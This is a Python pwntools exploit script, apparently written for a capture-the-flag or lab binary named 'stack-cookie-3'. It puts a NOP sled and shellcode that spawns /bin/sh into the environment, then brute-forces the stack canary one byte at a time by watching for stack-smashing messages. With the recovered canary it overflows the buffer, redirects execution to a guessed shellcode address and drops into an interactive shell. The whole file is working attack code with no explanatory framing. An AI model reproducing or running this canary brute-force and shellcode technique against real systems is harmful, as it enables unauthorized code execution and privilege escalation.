from pwn import *

SHELLCODE ='\x90' * 10000 + '\xb8\xca\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x801\xc0Phn/shh//bi\x89\xe31\xc91\xd2\xb8\x1b\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1c\xcd\x80'

env = {'SHELLCODE': SHELLCODE}
shellcode_addr = 0xffffd468 # Educated guess on where env is


# Steal the next byte of the cookie by trying all 256 options
def getOneCookie(p, currentCookie):
    for guess in xrange(256):
        print(p.recvuntil('read?\n'))
        p.sendline(str(0x80+len(currentCookie)+1))
        print(p.recv(0x1000))
        p.send('a' * 0x80 + currentCookie + chr(guess))
        data = ''
        while True:
            data += p.recv(1)
            if "detected" in data:
                break
            if "Exit status: 0" in data:
                break
        data += p.recvuntil('\n')
        if "smashing" in data:
            print data
            pass
        else:
            print("Got one: %d" % guess)
            newCookie = currentCookie + chr(guess)
            print data
            return newCookie


# Steal 4 bytes of cookie one byte at a time
def stealCookie(p):
    cookie = ""
    for i in xrange(4):
        cookie = getOneCookie(p, cookie)
    return cookie


def main():

    # Put shellcode in env
    p1 = process("./stack-cookie-3", env=env)

    # Steal cookie
    cookie = stealCookie(p1)

    # Send attack with cookie and jump to shellcode
    print(p1.recvuntil('read?\n'))
    p1.sendline(str(0x80+len(cookie)+32))
    print(p1.recv(0x1000))
    p1.sendline('a' * 0x80 + cookie + "xxxx" + "yyyy" + "aaaa" + p32(shellcode_addr))
    p1.interactive()

main()

